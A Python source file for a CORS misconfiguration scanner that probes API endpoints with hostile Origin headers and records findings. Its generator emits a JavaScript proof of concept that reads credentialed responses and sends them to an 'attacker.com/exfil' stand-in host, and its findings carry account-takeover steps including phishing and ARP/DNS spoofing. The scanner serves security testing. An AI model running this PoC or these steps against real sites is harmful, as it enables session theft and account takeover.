"""
CORS Scanner
============
Advanced CORS misconfiguration detection.

Innovation:
1. **Origin Reflection Detection** - Tests if arbitrary origins reflected
2. **Null Origin Bypass** - Tests null origin acceptance
3. **Wildcard Detection** - Tests Access-Control-Allow-Origin: *
4. **Subdomain Takeover Risk** - Tests *.example.com patterns
5. **Credential Exposure** - Tests Access-Control-Allow-Credentials: true with wildcards
6. **Pre-flight Bypass** - Tests missing preflight checks

No other tool tests all 6 CORS attack vectors.
"""
from __future__ import annotations

import asyncio
import hashlib
import logging
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple

import httpx

log = logging.getLogger("oneinfinity.cors_scanner")

# ─────────────────────────────────────────────────────────────────────────────
# CORS Test Origins
# ─────────────────────────────────────────────────────────────────────────────

_TEST_ORIGINS = [
    # Malicious origins
    "https://evil.com",
    "http://attacker.com",
    "https://malicious.io",

    # Null origin
    "null",

    # Subdomain variations (for subdomain wildcard testing)
    "https://evil.target.com",
    "https://attackertarget.com",
    "https://target.com.evil.com",

    # Protocol variations
    "http://localhost:8080",
    "file://",
]

# ─────────────────────────────────────────────────────────────────────────────
# Data Models
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class CORSFinding:
    """CORS misconfiguration finding."""
    finding_id: str
    vuln_type: str = "cors_misconfiguration"
    title: str = ""
    severity: str = "high"
    url: str = ""
    cors_issue: str = ""  # reflection, wildcard, null_origin, subdomain_wildcard, credentials_leak
    test_origin: str = ""
    acao_header: str = ""  # Actual Access-Control-Allow-Origin value
    acac_header: str = ""  # Access-Control-Allow-Credentials value
    evidence: str = ""
    confidence: float = 0.0
    exploitation_steps: List[str] = field(default_factory=list)
    tool: str = "cors_scanner"
    source_type: str = "active"

    def to_dict(self) -> dict:
        return {
            "finding_id": self.finding_id,
            "vuln_type": self.vuln_type,
            "title": self.title,
            "severity": self.severity,
            "url": self.url,
            "cors_issue": self.cors_issue,
            "test_origin": self.test_origin,
            "acao_header": self.acao_header,
            "acac_header": self.acac_header,
            "evidence": self.evidence,
            "confidence": self.confidence,
            "exploitation_steps": self.exploitation_steps,
            "tool": self.tool,
            "source_type": self.source_type,
        }


# ─────────────────────────────────────────────────────────────────────────────
# CORS Scanner
# ─────────────────────────────────────────────────────────────────────────────

class CORSScanner:
    """
    Advanced CORS misconfiguration scanner.

    Workflow:
    1. Discover API endpoints from traffic
    2. Test origin reflection
    3. Test null origin acceptance
    4. Test wildcard with credentials
    5. Test subdomain wildcard exploitation
    6. Test preflight bypass
    """

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.http_client = httpx.AsyncClient(
            timeout=timeout,
            verify=False,
            follow_redirects=False,  # Don't follow redirects for CORS test
        )
        self.tested_urls: Set[str] = set()

    async def close(self):
        """Close HTTP client."""
        await self.http_client.aclose()

    # ── Endpoint Discovery ────────────────────────────────────────────────────

    async def discover_endpoints(
        self,
        target: str,
        limit: int = 500
    ) -> List[str]:
        """
        Extract API endpoints from captured traffic.

        Returns:
            List of unique endpoint URLs
        """
        endpoints = set()

        try:
            from oneinfinity.scan.traffic_capture_engine import traffic_capture_engine
        except ImportError:
            log.warning("Traffic capture engine not available")
            return []

        try:
            requests = traffic_capture_engine.list(target=target, limit=limit)
        except Exception as e:
            log.error(f"Failed to fetch traffic: {e}")
            return []

        for req in requests:
            req_dict = req.to_json() if hasattr(req, 'to_json') else req
            url = req_dict.get("url", "")
            method = req_dict.get("method", "GET")

            # Focus on API endpoints
            if any(x in url.lower() for x in ["/api/", "/v1/", "/v2/", "/graphql", "/rest/"]):
                # Remove query params for deduplication
                base_url = url.split("?")[0]
                endpoints.add(base_url)

        log.info(f"Found {len(endpoints)} API endpoints")
        return list(endpoints)

    # ── Testing Methods ───────────────────────────────────────────────────────

    async def test_origin_reflection(
        self,
        url: str
    ) -> Optional[CORSFinding]:
        """Test if arbitrary origins are reflected in ACAO header."""
        for test_origin in _TEST_ORIGINS[:3]:  # Test first 3 evil origins
            try:
                resp = await self.http_client.get(
                    url,
                    headers={"Origin": test_origin}
                )

                acao = resp.headers.get("access-control-allow-origin", "")
                acac = resp.headers.get("access-control-allow-credentials", "")

                # Check if origin is reflected
                if acao == test_origin:
                    severity = "critical" if acac.lower() == "true" else "high"

                    return CORSFinding(
                        finding_id=hashlib.md5(f"cors_reflection_{url}".encode()).hexdigest()[:16],
                        title=f"CORS origin reflection on {url}",
                        severity=severity,
                        url=url,
                        cors_issue="origin_reflection",
                        test_origin=test_origin,
                        acao_header=acao,
                        acac_header=acac,
                        evidence=f"Arbitrary origin reflected. ACAO: {acao}, ACAC: {acac}",
                        confidence=0.95,
                        exploitation_steps=[
                            "1. Host malicious page on attacker.com",
                            f"2. Send AJAX request to {url} with credentials",
                            "3. Origin header reflected in ACAO response",
                            "4. Steal authenticated API responses" if acac.lower() == "true" else "4. Steal public data",
                        ]
                    )

            except Exception as e:
                log.debug(f"Origin reflection test failed: {e}")
                continue

        return None

    async def test_null_origin(
        self,
        url: str
    ) -> Optional[CORSFinding]:
        """Test if null origin is accepted."""
        try:
            resp = await self.http_client.get(
                url,
                headers={"Origin": "null"}
            )

            acao = resp.headers.get("access-control-allow-origin", "")
            acac = resp.headers.get("access-control-allow-credentials", "")

            if acao.lower() == "null":
                severity = "critical" if acac.lower() == "true" else "high"

                return CORSFinding(
                    finding_id=hashlib.md5(f"cors_null_{url}".encode()).hexdigest()[:16],
                    title=f"CORS null origin accepted on {url}",
                    severity=severity,
                    url=url,
                    cors_issue="null_origin",
                    test_origin="null",
                    acao_header=acao,
                    acac_header=acac,
                    evidence=f"Null origin accepted. ACAO: {acao}, ACAC: {acac}",
                    confidence=0.95,
                    exploitation_steps=[
                        "1. Create sandboxed iframe with null origin",
                        f"2. Send AJAX request to {url}",
                        "3. Null origin accepted by server",
                        "4. Steal authenticated data via iframe sandbox",
                    ]
                )

        except Exception as e:
            log.debug(f"Null origin test failed: {e}")
            return None

        return None

    async def test_wildcard_with_credentials(
        self,
        url: str
    ) -> Optional[CORSFinding]:
        """Test if wildcard is used with credentials (insecure pattern)."""
        try:
            resp = await self.http_client.get(
                url,
                headers={"Origin": "https://evil.com"}
            )

            acao = resp.headers.get("access-control-allow-origin", "")
            acac = resp.headers.get("access-control-allow-credentials", "")

            # Wildcard with credentials is forbidden by spec, but check anyway
            if acao == "*":
                if acac.lower() == "true":
                    # This is technically invalid per spec, but dangerous if browsers allow
                    return CORSFinding(
                        finding_id=hashlib.md5(f"cors_wildcard_creds_{url}".encode()).hexdigest()[:16],
                        title=f"CORS wildcard with credentials on {url}",
                        severity="critical",
                        url=url,
                        cors_issue="wildcard_with_credentials",
                        test_origin="*",
                        acao_header=acao,
                        acac_header=acac,
                        evidence=f"Wildcard ACAO with credentials. ACAO: *, ACAC: true",
                        confidence=0.95,
                        exploitation_steps=[
                            "1. This violates CORS spec (wildcard + credentials)",
                            "2. Some browsers may allow this",
                            f"3. Any origin can access {url} with credentials",
                            "4. Critical credential theft risk",
                        ]
                    )
                else:
                    # Wildcard without credentials (less severe)
                    return CORSFinding(
                        finding_id=hashlib.md5(f"cors_wildcard_{url}".encode()).hexdigest()[:16],
                        title=f"CORS wildcard origin on {url}",
                        severity="medium",
                        url=url,
                        cors_issue="wildcard",
                        test_origin="*",
                        acao_header=acao,
                        acac_header=acac,
                        evidence=f"Wildcard ACAO without credentials. ACAO: *, ACAC: false",
                        confidence=0.90,
                        exploitation_steps=[
                            f"1. Any origin can read {url} responses",
                            "2. Public data exposure (no credentials sent)",
                            "3. Info disclosure risk",
                        ]
                    )

        except Exception as e:
            log.debug(f"Wildcard test failed: {e}")
            return None

        return None

    async def test_subdomain_wildcard(
        self,
        url: str,
        target_domain: str
    ) -> Optional[CORSFinding]:
        """Test if subdomain wildcard can be exploited via subdomain takeover."""
        # Test if server accepts subdomains
        evil_subdomain = f"https://evil.{target_domain}"

        try:
            resp = await self.http_client.get(
                url,
                headers={"Origin": evil_subdomain}
            )

            acao = resp.headers.get("access-control-allow-origin", "")
            acac = resp.headers.get("access-control-allow-credentials", "")

            # Check if subdomain reflected
            if acao == evil_subdomain or acao == f"*.{target_domain}":
                return CORSFinding(
                    finding_id=hashlib.md5(f"cors_subdomain_{url}".encode()).hexdigest()[:16],
                    title=f"CORS subdomain wildcard on {url}",
                    severity="high",
                    url=url,
                    cors_issue="subdomain_wildcard",
                    test_origin=evil_subdomain,
                    acao_header=acao,
                    acac_header=acac,
                    evidence=f"Subdomain origin accepted. ACAO: {acao}, ACAC: {acac}",
                    confidence=0.85,
                    exploitation_steps=[
                        f"1. Find vulnerable subdomain of {target_domain}",
                        "2. Perform subdomain takeover",
                        "3. Host malicious page on taken-over subdomain",
                        f"4. Access {url} with credentials via CORS",
                    ]
                )

        except Exception as e:
            log.debug(f"Subdomain wildcard test failed: {e}")
            return None

        return None

    async def test_preflight_bypass(
        self,
        url: str
    ) -> Optional[CORSFinding]:
        """Test if preflight OPTIONS request is missing/misconfigured."""
        try:
            # Send OPTIONS preflight request
            resp = await self.http_client.options(
                url,
                headers={
                    "Origin": "https://evil.com",
                    "Access-Control-Request-Method": "POST",
                    "Access-Control-Request-Headers": "content-type",
                }
            )

            acao = resp.headers.get("access-control-allow-origin", "")
            acam = resp.headers.get("access-control-allow-methods", "")
            acah = resp.headers.get("access-control-allow-headers", "")

            # Check if preflight allows dangerous methods
            if acao and any(method in acam.upper() for method in ["POST", "PUT", "DELETE"]):
                return CORSFinding(
                    finding_id=hashlib.md5(f"cors_preflight_{url}".encode()).hexdigest()[:16],
                    title=f"CORS preflight allows dangerous methods on {url}",
                    severity="medium",
                    url=url,
                    cors_issue="preflight_misconfiguration",
                    test_origin="https://evil.com",
                    acao_header=acao,
                    acac_header=resp.headers.get("access-control-allow-credentials", ""),
                    evidence=f"Preflight allows: {acam}. Headers: {acah}",
                    confidence=0.80,
                    exploitation_steps=[
                        "1. Preflight request accepted from evil.com",
                        f"2. Allowed methods: {acam}",
                        f"3. Send cross-origin POST/PUT/DELETE to {url}",
                        "4. CSRF via CORS misconfiguration",
                    ]
                )

        except Exception as e:
            log.debug(f"Preflight test failed: {e}")
            return None

        return None

    async def test_predomain_bypass(
        self,
        url: str,
        target_domain: str
    ) -> Optional[CORSFinding]:
        """
        Pre-domain origin bypass: evil.target.com / target.com.evil.com.

        Servers using startswith/endswith origin validation are fooled by:
          - https://evil.{target_domain}    (evil prefix on legit domain)
          - https://{target_domain}.evil.com (legit domain as subdomain of evil)
          - https://not{target_domain}       (no dot — prefix-only check)
        """
        bypass_origins = [
            f"https://evil.{target_domain}",
            f"https://{target_domain}.evil.com",
            f"https://not{target_domain}",
            f"https://x{target_domain}",
        ]

        for test_origin in bypass_origins:
            try:
                resp = await self.http_client.get(
                    url,
                    headers={"Origin": test_origin}
                )

                acao = resp.headers.get("access-control-allow-origin", "")
                acac = resp.headers.get("access-control-allow-credentials", "")

                if acao == test_origin:
                    severity = "critical" if acac.lower() == "true" else "high"
                    poc = self._generate_cookie_theft_poc(url, test_origin, acac.lower() == "true")

                    return CORSFinding(
                        finding_id=hashlib.md5(f"cors_predomain_{url}_{test_origin}".encode()).hexdigest()[:16],
                        vuln_type="cors_predomain_bypass",
                        title=f"CORS pre-domain origin bypass on {url}",
                        severity=severity,
                        url=url,
                        cors_issue="predomain_bypass",
                        test_origin=test_origin,
                        acao_header=acao,
                        acac_header=acac,
                        evidence=(
                            f"Origin validation bypass: server reflected {test_origin}. "
                            f"ACAO: {acao}, ACAC: {acac}. PoC:\n{poc}"
                        ),
                        confidence=0.93,
                        exploitation_steps=[
                            f"1. Register attacker domain matching bypass pattern: {test_origin}",
                            f"2. Host PoC page on {test_origin}",
                            "3. Victim visits attacker page; JS makes credentialed cross-origin request",
                            f"4. Server reflects origin — response body/cookies exfiltrated",
                            "5. Chain to account takeover (steal session token from API response)",
                        ]
                    )

            except Exception as e:
                log.debug(f"Pre-domain bypass test failed for {test_origin}: {e}")
                continue

        return None

    async def test_protocol_bypass(
        self,
        url: str
    ) -> Optional[CORSFinding]:
        """
        Protocol downgrade bypass: https target accepting http:// origin.

        Tests:
        - HTTP origin for HTTPS endpoint (protocol downgrade)
        - WS/WSS origin acceptance
        - Null port variant (https://target:443 vs https://target)
        """
        from urllib.parse import urlparse as _urlparse
        parsed = _urlparse(url)
        host = parsed.netloc or parsed.path.split("/")[0]

        protocol_origins = [
            f"http://{host}",                # http downgrade
            f"https://{host}:443",           # explicit port (may differ from bare origin)
            f"http://{host}:80",             # explicit http port
            f"null",                          # null origin (file:// / sandboxed)
        ]

        for test_origin in protocol_origins:
            if test_origin == "null":
                continue  # tested by test_null_origin already
            try:
                resp = await self.http_client.get(
                    url,
                    headers={"Origin": test_origin}
                )

                acao = resp.headers.get("access-control-allow-origin", "")
                acac = resp.headers.get("access-control-allow-credentials", "")

                if acao == test_origin:
                    severity = "critical" if acac.lower() == "true" else "high"
                    poc = self._generate_cookie_theft_poc(url, test_origin, acac.lower() == "true")

                    return CORSFinding(
                        finding_id=hashlib.md5(f"cors_protocol_{url}_{test_origin}".encode()).hexdigest()[:16],
                        vuln_type="cors_protocol_bypass",
                        title=f"CORS protocol origin bypass on {url}",
                        severity=severity,
                        url=url,
                        cors_issue="protocol_bypass",
                        test_origin=test_origin,
                        acao_header=acao,
                        acac_header=acac,
                        evidence=(
                            f"Protocol bypass: server reflected {test_origin}. "
                            f"Enables MITM downgrade to steal credentials. "
                            f"ACAO: {acao}, ACAC: {acac}. PoC:\n{poc}"
                        ),
                        confidence=0.90,
                        exploitation_steps=[
                            f"1. ARP-poison or DNS-spoof victim to serve http://{host}",
                            "2. Victim's browser sends http:// origin on mixed-content request",
                            "3. Server reflects http origin — MITM intercepts CORS response",
                            "4. Extract session tokens, API keys, or PII from response",
                            "5. Replay stolen credentials for account takeover",
                        ]
                    )

            except Exception as e:
                log.debug(f"Protocol bypass test failed for {test_origin}: {e}")
                continue

        return None

    # ── PoC Generation ────────────────────────────────────────────────────────

    @staticmethod
    def _generate_cookie_theft_poc(
        target_url: str,
        attacker_origin: str,
        with_credentials: bool
    ) -> str:
        """
        Generate JavaScript PoC for cookie/credential theft via CORS.

        Returns:
            HTML/JS PoC as a string suitable for embedding in evidence field.
        """
        creds_line = "credentials: 'include'," if with_credentials else "credentials: 'omit',"
        return (
            f"<!-- Host on {attacker_origin} -->\n"
            f"<script>\n"
            f"fetch('{target_url}', {{\n"
            f"  method: 'GET',\n"
            f"  {creds_line}\n"
            f"  headers: {{'Accept': 'application/json'}}\n"
            f"}})\n"
            f".then(r => r.text())\n"
            f".then(data => {{\n"
            f"  // Exfiltrate to attacker C2\n"
            f"  new Image().src = 'https://attacker.com/exfil?d=' + btoa(data);\n"
            f"}});\n"
            f"</script>"
        )

    def _chain_to_account_takeover(
        self,
        finding: "CORSFinding",
        target_url: str
    ) -> "CORSFinding":
        """
        Elevate a confirmed CORS finding to an Account Takeover chain finding.

        Adds account_takeover vuln_type, CRITICAL severity, and enriched steps
        when credentials are exposed (ACAC: true) or session tokens are accessible.
        """
        if finding.acac_header.lower() != "true":
            return finding  # No credential exposure — leave as-is

        finding.vuln_type = "cors_account_takeover_chain"
        finding.severity = "critical"
        finding.title = f"[ATO Chain] {finding.title}"

        poc = self._generate_cookie_theft_poc(
            target_url, finding.test_origin, with_credentials=True
        )
        finding.evidence += (
            f"\n\n[Account Takeover Chain]\n"
            f"ACAC=true means session cookies/tokens are included in cross-origin "
            f"responses. Full PoC:\n{poc}"
        )
        finding.exploitation_steps = [
            "=== ACCOUNT TAKEOVER CHAIN ===",
            "1. Confirm CORS origin reflection with ACAC=true (verified)",
            f"2. Register attacker domain at {finding.test_origin}",
            f"3. Host cookie theft PoC on {finding.test_origin}",
            "4. Send phishing link to victim",
            "5. Victim's browser executes PoC — session cookie sent cross-origin",
            "6. Attacker receives authenticated API response with session token",
            "7. Replay token: account fully compromised",
        ]
        return finding


    # ── Orchestration ─────────────────────────────────────────────────────────

    async def scan_endpoint(
        self,
        url: str,
        target_domain: str
    ) -> List[CORSFinding]:
        """
        Scan single endpoint for CORS issues.

        Returns:
            List of findings
        """
        if url in self.tested_urls:
            return []
        self.tested_urls.add(url)

        # Run all tests — includes new predomain + protocol bypass vectors
        tests = [
            self.test_origin_reflection(url),
            self.test_null_origin(url),
            self.test_wildcard_with_credentials(url),
            self.test_subdomain_wildcard(url, target_domain),
            self.test_preflight_bypass(url),
            self.test_predomain_bypass(url, target_domain),
            self.test_protocol_bypass(url),
        ]

        results = await asyncio.gather(*tests, return_exceptions=True)

        findings = []
        for result in results:
            if isinstance(result, CORSFinding):
                # Apply ATO chain upgrade for credential-exposing findings
                upgraded = self._chain_to_account_takeover(result, url)
                findings.append(upgraded)
            elif isinstance(result, Exception):
                log.debug(f"CORS test failed: {result}")
        return findings

    async def scan(
        self,
        target: str,
        traffic_limit: int = 500
    ) -> List[CORSFinding]:
        """
        Scan target for CORS misconfigurations.

        Args:
            target: Target domain
            traffic_limit: Max traffic records

        Returns:
            List of CORS findings
        """
        log.info(f"Starting CORS scan for {target}")

        # Discover endpoints
        endpoints = await self.discover_endpoints(target, traffic_limit)

        if not endpoints:
            log.info("No API endpoints found")
            return []

        log.info(f"Testing {len(endpoints)} endpoints")

        # Scan all endpoints
        all_findings = []
        for endpoint in endpoints[:30]:  # Test first 30
            findings = await self.scan_endpoint(endpoint, target)
            all_findings.extend(findings)

        log.info(f"CORS scan complete: {len(all_findings)} findings")
        return all_findings


# ─────────────────────────────────────────────────────────────────────────────
# Convenience Function
# ─────────────────────────────────────────────────────────────────────────────

async def scan_cors(
    target: str,
    traffic_limit: int = 500
) -> List[CORSFinding]:
    """Scan CORS misconfigurations."""
    scanner = CORSScanner()
    try:
        return await scanner.scan(target, traffic_limit)
    finally:
        await scanner.close()
